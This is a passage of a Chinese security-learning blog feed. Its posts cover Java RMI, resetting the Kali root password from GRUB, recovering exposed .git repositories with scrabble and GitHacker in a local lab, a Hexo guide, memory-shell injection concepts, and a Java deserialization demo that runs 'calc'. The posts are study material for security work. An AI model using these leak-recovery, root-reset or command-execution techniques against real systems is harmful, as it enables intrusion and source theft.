id="1-创建远程接口">1.创建远程接口</h3><p>远程接口中声明了可以被客户程序访问的远程方法，RMI规范要求<strong>远程对象</strong>所属的类实现一个远程接口</p><p>并需要满足两个条件：</p><p>(1).直接或间接继承java.rmi.Remote接口<br>(2).接口中所有方法声明抛出java.rmi.RemoteException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Iservice</span> <span class="keyword">extends</span> <span class="title class_">Remote</span></span><br><span class="line">&#123;</span><br><span class="line">    String <span class="title function_">Service</span><span class="params">(String Content)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-创建远程类">2.创建远程类</h3><p>远程类就是远程对象所属的类。RMI规范要求远程类必须实现一个远程接口，另外为了使远程的实例变成能为远程客户提供服务的远程对象，可以通过两种途径把它导出（export）为远程对象</p><p>(1).实现远程接口的同时需要继承java.rmi.server.UnicastRemoteObject,并且远程类的构造方法必须声明抛出RemoteException</p><p>第一种：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Iservice</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServiceImpl</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Service</span><span class="params">(String Content)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;server&quot;</span>+Content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(2).如果远程类已经继承了其他类，无法再继承UnicastRemoteObject类，那么可以在构造方法中调用UnicastRemoteObject静态方法expectObject，同时构造方法必须声明RemoteException</p><p>第二种：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServiceImpl2</span> <span class="keyword">extends</span> <span class="title class_">Object</span> <span class="keyword">implements</span> <span class="title class_">Iservice</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServiceImpl2</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        UnicastRemoteObject.exportObject(<span class="built_in">this</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Service</span><span class="params">(String Content)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;server&quot;</span>+name+<span class="string">&quot;:&quot;</span>+Content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于UnicastRemoteObject.expectObject(this,0)</p><p>其中this是本对象，0为监听任意端口号</p><h3 id="3-创建服务器程序">3.创建服务器程序</h3><p>使用注册表rmiRegistry将远程对象与名称关联,服务器的一大功能就是向rmiRegistry注册表中注册对象。</p><p>从JDK1.3版本以上，RMI命名服务被整合到JNDI中（Java Naming and Directory Interface，Java名字与目录接口）之前有讲过，后面会重新再新开一篇。</p><p>在JNDI中 javax.naming.Context声明了<strong>注册，查找，以及注销对象</strong>的方法</p><p>​(1).bind(String name,Object obj)注册对象 name为url格式<br>​(2).rebind(String name,Object obj)注册对象 如果当前name已被绑定其他对象，当前的obj将会覆盖原来的对象<br>​(3).lookup(String name)  根据name查找对象，并返回对象<br>​(4).unbind(String name) 解绑对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException &#123;</span><br><span class="line">        <span class="type">Iservice</span> <span class="variable">server1</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ServiceImpl</span>(<span class="string">&quot;001&quot;</span>);</span><br><span class="line">        <span class="type">Iservice</span> <span class="variable">server2</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ServiceImpl2</span>(<span class="string">&quot;002&quot;</span>);</span><br><span class="line">        Context namingContext=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">// 初始化命名内容</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">8892</span>);<span class="comment">// 在本地主机上创建和导出注册表实例，并在指定的端口上接受请求</span></span><br><span class="line">        namingContext.rebind(<span class="string">&quot;rmi://localhost:8892/server1&quot;</span>,server1);</span><br><span class="line">        namingContext.rebind(<span class="string">&quot;rmi://localhost:8892/server2&quot;</span>,server2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-创建客户端程序">4.创建客户端程序</h3><p>使用lookup查找远程对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        Context namingContext=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        Iservice cserver= (Iservice) namingContext.lookup(<span class="string">&quot;rmi://localhost:8892/server1&quot;</span>);</span><br><span class="line">        Iservice cserver2= (Iservice) namingContext.lookup(<span class="string">&quot;rmi://localhost:8892/server2&quot;</span>);</span><br><span class="line">        System.out.println(cserver.Service(<span class="string">&quot;haha&quot;</span>));</span><br><span class="line">        System.out.println(cserver2.Service(<span class="string">&quot;nihao&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-实例测试">5.实例测试</h3><p>先运行ServerTest，再运行Client客户端程序得到以下结果</p><p><img src="image-20230221213627792.png" alt="image-20230221213627792"></p><p>以上内容相当于对大佬的文章进行再理解，重新整理成我自己能理解的样子，另外其中的代码都是按照自己的理解打的，欢迎各位指正。</p><p>可以看一下大佬的文章讲的更为细致</p><p>参考链接<a href="http://blog.csdn.net/guyuealian/article/details/51992182">http://blog.csdn.net/guyuealian/article/details/51992182</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SVN泄露</title>
      <link href="/2023/02/01/SVN%E6%B3%84%E9%9C%B2/"/>
      <url>/2023/02/01/SVN%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali永久提升root权限</title>
      <link href="/2023/01/28/kali%E6%B0%B8%E4%B9%85%E6%8F%90%E5%8D%87root%E6%9D%83%E9%99%90/"/>
      <url>/2023/01/28/kali%E6%B0%B8%E4%B9%85%E6%8F%90%E5%8D%87root%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<h5 id="第一步：">第一步：</h5><p>开启虚拟机，进入到下面这个界面时，按E</p><p><img src="image-20230128105449594.png" alt="image-20230128105217924"></p><p>进入以下页面<img src="image-20230128105716234.png" alt="image-20230128105716234"></p><h5 id="第二步：">第二步：</h5><p>找到<strong>linux</strong>这一行将<code>ro quiet splash</code> 修改为 <code>rw quiet splash init=/bin/bash</code></p><p><img src="image-20230128105923289.png" alt="image-20230128105923289"></p><h5 id="第三步：">第三步：</h5><p>按F10进入单用户模式<br>执行<code>passwd root</code>命令修改root密码</p><p><img src="image-20230128110240241.png" alt="image-20230128110240241"></p><p>修改成功后重启kali</p><h5 id="第四步：">第四步：</h5><p>使用刚刚修改的密码进行登录</p><p><img src="image-20230128110629130.png" alt="image-20230128110629130"></p><p><img src="image-20230128110708458.png" alt="image-20230128110708458"></p><p>成功！</p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息搜集学习</title>
      <link href="/2023/01/26/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/01/26/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>跟着从0到1这本书学习一下，大部分都笼统学过一些，但碍于不够系统，现在想要拾起来，从头再来罢了，欢迎各位一起监督学习</p><h1>1.1举足轻重的信息搜集</h1><h2 id="信息搜集的分类">信息搜集的分类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">敏感目录</span><br><span class="line"></span><br><span class="line">敏感备份文件</span><br><span class="line"></span><br><span class="line">Banner识别</span><br></pre></td></tr></table></figure><h2 id="敏感目录泄露">敏感目录泄露</h2><p>通过敏感目录泄露，我们网袜给能获取网站的源代码和敏感的URL地址<br>如网站的后台地址等。</p><h3 id="1-git泄露">1.git泄露</h3><p>【漏洞简介】：git是一个主流的分布式版本控制系统，开发人员在开发过程中经常会遗忘.git文件夹，导致攻击者可以从.git文件夹中的信息获取开发人员在开发过程中提交过的所有源码，进而导致服务器被攻击而沦陷</p><h4 id="（1）常规git泄露">（1）常规git泄露</h4><p>【使用工具】：scrabble:<a href="https://github.com/denny0223/scrabble">denny0223/scrabble: Simple tool to recover .git folder from remote server (github.com)</a></p><p>首先<strong>本地搭建web环境</strong>,这里使用的是自己的kali虚拟机</p><h5 id="1-安装apache2服务">1.安装apache2服务</h5><p>使用<code>apt-get install apache2</code>安装apache2的服务</p><p><img src="image-20230128112331180.png" alt="image-20230128112331180"></p><p>可以使用<code>service apache2 start</code>开启apache2服务<br>同样使用<code>service apache2 status</code>查看apache2服务是否开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start //开启服务</span><br><span class="line">service apache2 status //查看服务状态</span><br><span class="line">service apache2  stop //停止服务</span><br></pre></td></tr></table></figure><p>如下图为开启状态</p><p><img src="image-20230128112658874.png" alt="image-20230128112658874"></p><p>使用浏览器打开127.0.0.1查看得到以下界面</p><p><img src="image-20230128113218985.png" alt="image-20230128113218985"></p><p>然后使用ifconfig查一下IP地址</p><p><img src="image-20230128113404350.png" alt="image-20230128113404350"></p><p>再次使用浏览器访问刚刚查到的自己的ip（上图白色部分位置）得到同样页面<br><img src="image-20230128113549628.png" alt="image-20230128113549628"></p><p>进行下一步</p><h5 id="2-创建一个git-test文件夹-并搭建实验场景">2.创建一个git_test文件夹,并搭建实验场景</h5><p>进入<code>var/www/html</code>中创建一个git_test文件夹</p><p><img src="image-20230128114513598.png" alt="image-20230128114513598"></p><p>初始化git仓库 <code>git init</code></p><p><img src="image-20230128121207216.png" alt="image-20230128121207216"></p><p>创建flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch flag.php //创建flag.php文件</span><br><span class="line">vim flag.php //编辑flag.php文件，随便输入一些内容</span><br><span class="line">git add flag.php // 添加flag.php到文件暂存区</span><br></pre></td></tr></table></figure><p><img src="image-20230128121238417.png" alt="image-20230128121238417"></p><p><strong><u>（ps：this is flag hhhh是我自己输入的内容）</u></strong></p><p>然后提交修改<code>git commit  -m  &quot;flag&quot;</code></p><p><img src="image-20230128121311790.png" alt="image-20230128121311790"></p><p>这里我没有设置邮箱和用户名，不过影响不大，实验场景搭建完成</p><h5 id="3-获取scrabble工具，运行工具得到flag">3.获取scrabble工具，运行工具得到flag</h5><p>此时回到当前用户目录<code>cd ~</code></p><p>使用<code>git clone https://github.com/denny0223/scrabble.git</code></p><p>将工具克隆到本地</p><p><img src="image-20230128121342190.png" alt="image-20230128121342190"></p><p>发现多了一个scrabble文件夹，进入，使用工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用方法：scrabble &lt;url&gt;</span><br><span class="line">示例：scrabble http://example.com/</span><br></pre></td></tr></table></figure><p>使用工具，目标为我们刚刚搭建的git_test</p><p><code>./scrabble http://127.0.0.1/git_test/</code></p><p><img src="image-20230128120959386.png" alt="image-20230128120959386"></p><p>使用命令<code>ls</code>得到<strong>flag.php</strong><br>使用<code>cat flag.php</code> 命令得到flag</p><p><img src="image-20230128122116935.png" alt="image-20230128122116935"></p><h4 id="（2）git回滚">（2）git回滚</h4><p>【原理】：git作为版本控制工具，会记录每次提交（commit）的修改所以当存在git泄露时，敏感信息可能被删除或者被覆盖了，这时我们可以利用git的<code>git reset</code>命令恢复到以前的版本</p><p>【环境复现】：</p><p>我们重新提交一个新的版本的flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;flag is old &quot; &gt; flag.php //修改flag.php的内容</span><br><span class="line">cat flag.php //获取flag.php的内容</span><br><span class="line">git add flag.php //添加flag.php到文件暂存区</span><br><span class="line">git commit -m &quot;old&quot; //提交</span><br></pre></td></tr></table></figure><p><img src="image-20230128151641338.png" alt="image-20230128151641338"></p><p>此时flag.php的内容为：</p><p><img src="image-20230128152126614.png" alt="image-20230128152126614"></p><p>【版本回调】：我们先使用scrabble工具获取源码（回到scrabble文件夹）</p><p><img src="image-20230128154349821.png" alt="image-20230128154349821"></p><p><strong><u>（ps：突然发现这个工具用完就没了，不知道有什么解决方法，所以推荐下载一个压缩包，每次使用都解压一次，这里是删了重下的）</u></strong></p><p>获取源码：</p><p><img src="image-20230128154551483.png" alt="image-20230128154551483"></p><p>再通过 <code>git reset --hard HEAD^</code>命令跳到上一版本（在git中，用HEAD表示当前版本，上一个版本是HEAD^），即可获取到源码</p><p><img src="image-20230128154630452.png" alt="image-20230128154630452"></p><p>另外可以使用 <code>git log</code>可以查看提交历史记录并可以使用<code>git reset --hard [commit id]</code>来回退到相应版本</p><p><img src="image-20230128202835665.png" alt="image-20230128202835665"></p><p><strong><u>（ps：commit id为划线部分，可以只使用前几位，系统会自己匹配，如下图）</u></strong></p><p>使用<code>git reflog</code>查看历史每一次命令，并且可以看到每次提交的commit id （<strong>精简版</strong>）搭配版本回退命令，可以达到类似的效果（如下图）</p><p><img src="image-20230128160508603.png" alt="image-20230128160508603"></p><p>命令总结：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git reflog //查看历史命令</span><br><span class="line">git reset --hard xxx //回退版本 HEAD代表当前版本 HEAD^代表上一版本 HEAD~100表示回退100个版本</span><br><span class="line">git log //查看提交历史记录</span><br></pre></td></tr></table></figure><h5 id="（3）git分支">（3）git分支</h5><p>【原理】：git允许使用多个分支，从而使用户可以把工作从开发主线上分离出来，以免影响开发主线，如果没有新建分支，那么只有一条时间线，即只有一个分支，默认为master。因此敏感文件可能藏在别的分支中，使用git log只能看到当前分支的提交历史，无法看到其他分支的信息，而大多数git泄露都不支持切换分支，因此需要用到新的工具<a href="https://github.com/WangYihang/GitHacker">GitHacker</a></p><p>这里书里没有过多赘述，并且描述并不详细，不过还是要自己复现一下，以加深印象</p><p>【环境复现】：使用<code>git branch</code> 可以查看分支，此时只有master</p><p>使用 <code>git branch dev</code>创建一个名为dev的分支（<strong>名字随意</strong>）</p><p>再次查看分支，此时有两个分支：master和dev，此时master有*<strong>标并且颜色为绿色</strong>代表此时处在master分支，如下图：</p><p><img src="image-20230128210339890.png" alt="image-20230128210339890"></p><p>使用<code>git checkout dev</code>命令可以切换到dev分支</p><p>此时修改flag.php的内容为flag{new flag is here}</p><p><img src="image-20230128210907463.png" alt="image-20230128210907463"></p><p>git二连（加入暂存区，提交）如下图：</p><p><img src="image-20230128211151702.png" alt="image-20230128211151702"></p><p>使用<code>git checkout master</code>回到master页面。发现flag.php的内容仍为原来的，环境搭建完成！</p><p><img src="image-20230128213658558.png" alt="image-20230128213658558"></p><p>接下来进行复现漏洞：</p><p>首先安装工具<code>python3 -m pip install -i https://pypi.org/simple/ GitHacker</code></p><p><img src="image-20230128213221099.png" alt="image-20230128213221099"></p><p>安装成功后便可以直接使用githacker命令了 <code>githacker --url http://127.0.0.1/git_test/.git --output-folder result</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">githacker --url http://127.0.0.1/git_test/.git --output-folder result</span><br><span class="line">//--url 后面跟url与scrabble不同的是，git hacker需要将.git路径加上</span><br><span class="line">//--output-folder xxx 表示结果将要输出到result文件夹中</span><br></pre></td></tr></table></figure><p><img src="image-20230128214149062.png" alt="image-20230128214149062"></p><p>执行命令后，在目录里生成了一个result文件夹，进入最里面的路径发现有一个flag.php打开发现内容为</p><p><img src="image-20230128214350931.png" alt="image-20230128214350931"></p><p>内容正是master分支下的flag.php的内容，使用<code>git reflog</code>看到是从tmp文件中clone出来的</p><p><img src="image-20230128215450007.png" alt="image-20230128215450007"></p><p>我们找到那个临时文件夹 使用<code>git reflog</code>命令可以看到所有的checkout信息</p><p><img src="image-20230128215605655.png" alt="image-20230128215605655"></p><p>之后就可以切换到dev分支找到flag</p>]]></content>
      
      
      <categories>
          
          <category> 从0到1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo使用指南</title>
      <link href="/2022/12/17/hexo%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2022/12/17/hexo%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p>1.在本地创建文章</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;文章标题&quot;</span><br></pre></td></tr></table></figure><p>2.生成发布</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo g #生成页面</span><br><span class="line"></span><br><span class="line">hexo d #部署发布</span><br></pre></td></tr></table></figure><p>3.预览页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s #在本地生成预览页面</span><br></pre></td></tr></table></figure><p>4.在source目录下，执行下面命令，建立标签页</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &quot;tags&quot; </span><br></pre></td></tr></table></figure><p>5.在hexo文章中插入图片</p><p>在<code>config.yaml</code>文件中更改一下配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>此时创建文章会生成新的同名文件夹，但引用却很麻烦</p><p>因此要使用插件<a href="https://link.zhihu.com/?target=https%3A//github.com/hexojs/hexo-renderer-marked">hexo-renderer-marked</a></p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-marked</span><br></pre></td></tr></table></figure><p>进行安装，之后</p><p>在<code>config.yaml</code>文件中更改一下配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">marked:</span></span><br><span class="line">  <span class="attr">prependRoot:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">postAsset:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>在typora中系修改如下配置（文件—偏好设置）</p><p><img src="1.png" alt="1"></p><p>这样无论是插入的本地图片还是网络图片都会变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](文章名/图片)</span><br></pre></td></tr></table></figure><p>的样式</p><p>解决！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 使用指南 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2漏洞复现</title>
      <link href="/2022/06/21/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/06/21/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内存马学习</title>
      <link href="/2022/06/16/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/06/16/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h4 id="Java反射">Java反射</h4><p>正常类的加载过程：(以Student类为例)</p><blockquote><p>1.当执行new Student()时，会触发JVM加载Student.class文件<br>2.JVM从本地磁盘找到Sudent.class文件并加载到JVM内存中<br>3.class文件加载后，JVM会自动创建一个class对象，一个类只能产生一个class对象</p></blockquote><p>Java反射的本质：</p><blockquote><p>在内存中得到class对象，反向获取Student对象的信息</p></blockquote><p>Java反射的步骤：</p><blockquote><ul><li>获取目标类型的Class对象</li><li>通过 Class 对象分别获取Constructor类对象、Method类对象 &amp; Field 类对象</li><li>通过 Constructor类对象、Method类对象 &amp; Field类对象分别获取类的构造函数、方法&amp;属性的具体信息，并进行后续操作</li></ul></blockquote><h4 id="Java-Instrumentation">Java Instrumentation</h4><blockquote><p>Instrumentation是Java提供的一个来自JVM的接口，该接口提供了一系列查看和操作Java类定义的方法，例如修改类的字节码、向classLoader的classpath下加入jar文件等，使得开发者可以通过Java语言来操作和监控JVM内部的一些状态，进而实现Java程序的监控分析，甚至实现一些特殊功能（如AOP、热部署）</p></blockquote><blockquote><p>Java agent 通过Instrumentation API与JVM交互</p></blockquote><p>在注入<a href="https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98&amp;spm=1001.2101.3001.7020">内存</a>马的过程中，我们可以利用java Instrumentation机制，动态的修改已加载到内存中的类里的方法，进而注入恶意的代码</p><h4 id="内存马类型">内存马类型</h4><ul><li>servlet-api类：filter型、servlet型、listener型</li><li>spring类：interceptor型、controller型</li><li>Java Instrumentation类：agent型</li></ul><h4 id="内存马简介">内存马简介</h4><p><strong>目标</strong>：访问url或指定url，带上命令执行参数，即可让服务器返回执行结果</p><p><strong>实现</strong>：以java为例，客户端发起的web请求会依次经过Listener、Filter、Servlet三个组件，我们只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的</p><h4 id="内存码原理与实现：">内存码原理与实现：</h4><p>实现：</p><p>servlet型：创建一个恶意的servlet，获取当前的standardcontext，将恶意servlet封装成wapper添加到StandardContext的child中，添加servletMapping将访问的URL和wapper进行绑定</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA反序列化漏洞浅析</title>
      <link href="/2022/06/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/06/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h4 id="JAVA反序列化与ObjectInputStream">JAVA反序列化与ObjectInputStream</h4><p>关于ObjectOutputStream：</p><blockquote><p>ObjectOutputStream:对象的<strong>序列化流</strong>，作用：把对象转成字节数据的输出到文件中保存，对象的输出过程称为<strong>序列化</strong>，可实现对象的持久存储。</p></blockquote><p>关于ObjectInputStream：</p><blockquote><p>ObjectInputStream <strong>反序列化流</strong>，将之前使用 ObjectOutputStream 序列化的原始数据恢复为对象，以流的方式读取对象。</p></blockquote><p>在JAVA中，利用ObjectinputStream的readObject方法进行对象读取时，如果，目标对象已经重写了readObject方法，那么此时就会执行已经被重写的readObject如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个MyObj类，此时MyObj类需要继承Serializable才能进行序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObj</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> Exception, IOException &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">in.defaultReadObject();</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);<span class="comment">//执行calc命令</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main方法，将新的MyObj对象序列化后写入object文件，之后反序列化后再读取出来</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">MyObj o=<span class="keyword">new</span> <span class="title class_">MyObj</span>();</span><br><span class="line">o.setName(<span class="string">&quot;haha wocao&quot;</span>);</span><br><span class="line">FileOutputStream fos=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">ObjectOutputStream os=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">os.writeObject(o);</span><br><span class="line">os.close();</span><br><span class="line">FileInputStream fis=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">MyObj o1=(MyObj) ois.readObject();</span><br><span class="line">System.out.println(o1.getName());</span><br><span class="line">ois.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击运行后，发现输出了“haha wocao”并执行了calc命令</p><p>![](2022-06-15 